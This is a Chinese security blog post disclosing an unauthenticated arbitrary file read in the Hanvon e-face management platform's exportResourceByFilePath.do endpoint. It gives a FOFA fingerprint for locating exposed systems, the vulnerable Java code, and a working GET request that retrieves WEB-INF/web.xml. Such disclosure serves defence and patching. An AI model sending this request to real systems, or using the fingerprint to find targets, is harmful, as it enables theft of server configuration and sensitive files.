---
title: "汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-leaveList-exportResourceByFilePath-fileread.html
asset_dir: assets/汉王e脸通综合管理平台-exportresourcebyfilepath.do-任意文件读取漏洞
---

# 汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/20 08:27
- 812浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

在线安全工具

Web安全书籍

Docker加速服务

---

# 漏洞简介

汉王e脸通综合管理平台 exportResourceByFilePath.do 接口存在任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。攻击者可在无需认证的情况下，通过构造恶意请求访问 exportResourceByFilePath.do 接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。

漏洞预警服务

# 影响版本

v1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `LeaveListController` 下的 `exportResourceByFilePath.do` 实现方式

```
@ResponseBody
@RequestMapping(
    value = {"exportResourceByFilePath.do"},
    method = {RequestMethod.GET}
)
public void exportResourceByFilePath(@RequestParam(required = false,value = "filePath") String filePath, HttpServletResponse response) throws Exception {
    try {
        String path = TheApp.getRootPath("");
        String photoPath = path + filePath;
        File file = new File(photoPath);
        if (file.exists()) {
            InputStream inStream = new FileInputStream(photoPath);
            response.reset();
            response.setContentType("bin");
            response.addHeader("Content-Disposition", "attachment;filename=\"" + new String(filePath.getBytes("utf-8"), "ISO8859-1") + "\"");
            byte[] b = new byte[100];

            int len;
            while((len = inStream.read(b)) > 0) {
                response.getOutputStream().write(b, 0, len);
            }

            inStream.close();
        }
    } catch (IOException e) {
        e.printStackTrace();
    }

}
```

深入探索

编码转换工具

传输层安全性协议

网络安全会议

对用户可控参数 `filePath` 无任何过滤或校验，直接拼接路径返回文件路径进行文件操作，也是朴实无华的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
GET /manage/leaveList/exportResourceByFilePath.do?recoToken=67mds2pxXQb&filePath=WEB-INF/web.xml HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞](images/img-001-05ae55a546e4.webp)](https://image.mrxn.net/2a8433a9dbc84c42b130766151fbf778.webp)

成功读取到 web.xml 文件

网络安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
